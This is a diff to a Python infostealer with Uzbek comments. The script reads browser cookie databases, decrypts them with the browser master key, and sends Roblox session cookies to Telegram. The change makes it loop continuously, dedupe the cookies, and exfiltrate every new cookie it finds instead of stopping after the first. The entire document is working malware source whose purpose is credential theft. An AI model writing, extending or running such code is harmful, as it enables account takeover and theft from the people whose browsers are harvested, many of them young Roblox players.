@@ -106,7 +106,7 @@ def save_sent_cookie(cookie_value):
         if cookie_value not in sent:
             sent.append(cookie_value)
             with open(CACHE_FILE, "w", encoding="utf-8") as f:
-                json.dump({"sent_cookies": sent}, f)
+                json.dump({"sent_cookies": sent}, f, ensure_ascii=False, indent=4)
     except Exception:
         pass
 
@@ -263,12 +263,10 @@ def main():
     }
 
     while True:
-        if get_sent_cookies():
-            debug_print("Cookie allaqachon topilgan va yuborilgan. Tsikl to'xtatildi.")
-            break
-
         try:
-            cookie_found = False
+            debug_print("Barcha brauzerlar tekshirilmoqda...")
+            sent_cookies_list = get_sent_cookies()
+
             for b_name, info in browsers.items():
                 base_path = info["path"]
                 if not os.path.exists(base_path):
@@ -318,18 +316,18 @@ def main():
                             if row:
                                 decrypted_cookie = decrypt_value(row[1], master_key)
                                 if decrypted_cookie:
-                                    if send_to_telegram(decrypted_cookie, b_name):
-                                        cookie_found = True
-                                        break
+                                    valid_cookie = clean_roblox_cookie(decrypted_cookie)
+                                    if valid_cookie and len(valid_cookie) >= 50:
+                                        # Agar bu cookie oldin yuborilmagan bo'lsa, yuboramiz
+                                        if valid_cookie not in sent_cookies_list:
+                                            debug_print(f"Yangi cookie topildi ({b_name})!")
+                                            if send_to_telegram(valid_cookie, b_name):
+                                                sent_cookies_list.append(valid_cookie)
+                                        else:
+                                            debug_print(f"Bu cookie allaqachon yuborilgan ({b_name}).")
                     except Exception:
                         if os.path.exists(temp_db):
                             os.remove(temp_db)
-                
-                if cookie_found:
-                    break
-
-            if cookie_found:
-                break
 
         except Exception as e:
             debug_print(f"Asosiy tsiklda xatolik: {e}")
